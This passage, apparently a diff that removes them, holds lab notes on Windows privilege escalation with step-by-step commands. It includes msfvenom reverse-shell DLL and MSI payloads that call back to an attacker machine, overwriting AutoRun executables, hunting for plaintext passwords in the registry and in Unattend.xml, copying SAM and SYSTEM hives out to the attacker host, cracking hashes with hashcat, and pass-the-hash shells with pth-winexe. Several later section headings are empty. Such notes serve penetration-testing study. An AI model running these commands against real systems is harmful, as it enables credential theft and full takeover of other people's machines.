-# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o hijackme.dll
-```
-11. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a
-listener on Kali and then stop/start the service to trigger the exploit:
-```
-> net stop dllsvc
-```
-```
-> net start dllsvc
-```
-
-
-### Registry exploits
-
-#### AutoRuns
-Windows can be configured to run commands at startup,
-with elevated privileges.
-
-These “AutoRuns” are configured in the Registry.
-If you are able to write to an AutoRun executable, and are
-able to restart the system (or wait for it to be restarted) you
-may be able to escalate privileges.
-
-  
-#### Privilege Escalation
-
-1. Use winPEAS to check for writable AutoRun executables:
-```
-> .\winPEASany.exe quiet applicationsinfo
-```
-2. Alternatively, we could manually enumerate the AutoRun executables:
-```
-> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-```
-and then use accesschk.exe to verify the permissions on each one:
-```
-> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
-```
-
-3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by
-Everyone. Create a backup of the original:
-```
-> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
-```
-4. Copy our reverse shell executable to overwrite the AutoRun executable:
-```
-> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
-```
-5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on
-Windows 10, the exploit appears to run with the privileges of the last logged on user, so log
-out of the “user” account and log in as the “admin” account first.
-
-#### AlwaysInstallElevated REG 
-MSI files are package files used to install applications.
-These files run with the permissions of the user trying to install
-them.
-
-Windows allows for these installers to be run with elevated (i.e.
-admin) privileges.
-
-If this is the case, we can generate a malicious MSI file which
-contains a reverse shell.
-
-The catch is that two Registry settings must be enabled for this to work.
-The “AlwaysInstallElevated” value must be set to 1 for both the local
-machine:
-HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
-and the current user:
-HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
-If either of these are missing or disabled, the exploit will not work.
-
-#### 1.Use winPEAS to see if both registry values are set:
-```
-> .\winPEASany.exe quiet windowscreds
-```
-2.Alternatively, verify the values manually:
-```
-> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-```
-```
-> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-```
-
-3.Create a new reverse shell with msfvenom, this time using the msi format,
-and save it with the .msi extension:
-```
-# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
-```
-4.Copy the reverse.msi across to the Windows VM, start a listener on Kali,
-and run the installer to trigger the exploit:
-```
-> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
-```
-
-### passwords
-#### Passwords?
-
-Yes, passwords.
-
-Even administrators re-use their passwords, or leave
-their passwords on systems in readable locations.
-Windows can be especially vulnerable to this, as several
-features of Windows store passwords insecurely.
-
-#### Registry
-Plenty of programs store configuration options in the
-Windows Registry.
-
-Windows itself sometimes will store passwords in
-plaintext in the Registry.
-
-It is always worth searching the Registry for passwords.
-
-#### Searching the Registry for Passwords
-The following commands will search the registry for keys and
-values that contain “password”
-```
-> reg query HKLM /f password /t REG_SZ /s
-```
-```
-> reg query HKCU /f password /t REG_SZ /s
-```
-This usually generates a lot of results, so often it is more
-fruitful to look in known locations.
-
-#### Privilege Escalation
-
-1.Use winPEAS to check common password locations:
-```
-> .\winPEASany.exe quiet filesinfo userinfo
-```
-(the final checks will take a long time to complete)
-2.The results show both AutoLogon credentials and Putty
-session credentials for the admin user
-(admin/password123).
-
-3.We can verify these manually:
-```
-> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
-```
-```
-> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
-```
-4.On Kali, we can use the winexe command to spawn a shell using these
-credentials:
-```
-# winexe -U 'admin%password123' //192.168.1.22 cmd.exe
-```
-if your a admin (or have admin creds etc) you can modify the command a bit and add 
-```
---system
-```
-so for an example: 
-```
-# winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe
-```
-to spawn a system shell
-
-
-#### Saved Creds
-Windows has a runas command which allows users to run
-commands with the privileges of other users.
-This usually requires the knowledge of the other user’s
-password.
-
-However, Windows also allows users to save their credentials
-to the system, and these saved credentials can be used to
-bypass this requirement.
-
-#### Privilege Escalation
-1.Use winPEAS to check for saved credentials:
-```
-> .\winPEASany.exe quiet cmd windowscreds
-```
-2.It appears that saved credentials for the admin user exist.
-
-3.We can verify this manually using the following command:
-```
-> cmdkey /list
-```
-
-4.If the saved credentials aren’t present, run the following script to
-refresh the credential: (ops just in this lab/demo)
-```
-> C:\PrivEsc\savecred.bat
-```
-5.We can use the saved credential to run any command as the admin
-user. Start a listener on Kali and run the reverse shell executable:
-```
-> runas /savecred /user:admin C:\PrivEsc\reverse.exe
-```
-
-### Configuration Files
-Some administrators will leave configurations files on
-the system with passwords in them.
-
-The Unattend.xml file is an example of this.
-It allows for the largely automated setup of Windows
-systems.
-
-#### Searching for Configuration Files
-Recursively search for files in the current directory with
-“pass” in the name, or ending in “.config”:
-```
-> dir /s *pass* == *.config
-```
-Recursively search for files in the current directory that
-contain the word “password” and also end in either .xml, .ini,
-or .txt:
-```
-> findstr /si password *.xml *.ini *.txt
-```
-
-#### Privilege Escalation
-1. Use winPEAS to search for common files which may
-contain credentials:
-```
-> .\winPEASany.exe quiet cmd searchfast filesinfo
-```
-2. The Unattend.xml file was found. View the contents:
-```
-> type C:\Windows\Panther\Unattend.xml
-``` 
-3.A password for the admin user was found. The password
-is Base64 encoded: cGFzc3dvcmQxMjM=
-
-4.On Kali we can easily decode this:
-```
-# echo "cGFzc3dvcmQxMjM=" | base64 -d
-```
-5.Once again we can simply use winexe to spawn a shell as
-the admin user.
-
-### SAM
-Windows stores password hashes in the Security Account
-Manager (SAM).
-
-The hashes are encrypted with a key which can be found in a
-file named SYSTEM.
-
-If you have the ability to read the SAM and SYSTEM files, you
-can extract the hashes.
-
-#### SAM/SYSTEM Locations
-The SAM and SYSTEM files are located in the
-C:\Windows\System32\config directory.
-
-The files are locked while Windows is running.
-
-Backups of the files may exist in the C:\Windows\Repair
-or C:\Windows\System32\config\RegBack directories.
-
-#### Privilege Escalation
-1.Backups of the SAM and SYSTEM files can be found in
-C:\Windows\Repair and are readable by our user.
-
-2.Copy the files back to Kali:
-```
-> copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
-```
-```
-> copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
-```
-
-3.Download the latest version of the creddump suite:
-```
-# git clone https://github.com/Neohapsis/creddump7.git
-```
-4.Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
-```
-# python2 creddump7/pwdump.py SYSTEM SAM
-```
-5.Crack the admin user hash using hashcat:
-```
-# hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
-```
-
-### Passing the Hash
-Windows accepts hashes instead of passwords to
-authenticate to a number of services.
-
-We can use a modified version of winexe, pth-winexe to
-spawn a command prompt using the admin user’s hash.
-
-#### Privilege Escalation
-1.Extract the admin hash from the SAM in the previous step.
-2.Use the hash with pth-winexe to spawn a command prompt:
-```
-# pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
-```
-3.Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
-```
-# pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
-```
-
-### scheduled tasks
-
-### insecure GUI apps
-
-### startup apps
-
-### installed apps
-
-### hot potato
-
-### token impersonation
-
-### port forwarding
-
-### privilege escalation strategy
-
-### getsystem Named Pipes and Token Duplication
-
-### user privileges
 
 
 -------------------------------------------------------------------------------------
